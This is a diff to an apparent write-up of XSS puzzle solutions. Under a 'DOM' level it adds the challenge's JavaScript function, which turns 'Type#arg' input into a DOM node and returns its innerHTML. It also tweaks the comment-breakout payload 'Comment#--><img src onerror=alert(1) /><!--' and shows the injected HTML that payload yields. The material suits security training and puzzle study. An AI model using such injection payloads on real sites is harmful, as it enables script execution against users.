@@ -84,10 +84,31 @@ function escape(s) {
 
 ## DOM
 
+- Task
+
+```
+function escape(s) {
+  // Slightly too lazy to make two input fields.
+  // Pass in something like "TextNode#foo"
+  var m = s.split(/#/);
+
+  // Only slightly contrived at this point.
+  var a = document.createElement('div');
+  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
+  return a.innerHTML;
+}
+```
+
 - Solution
 
 ```
-Comment#--><img src onerror=alert(1)/><!--
+Comment#--><img src onerror=alert(1) /><!--
+```
+
+- HTML source
+
+```
+<!----><img src onerror=alert(1) /><!---->
 ```
 
 ## Skandia
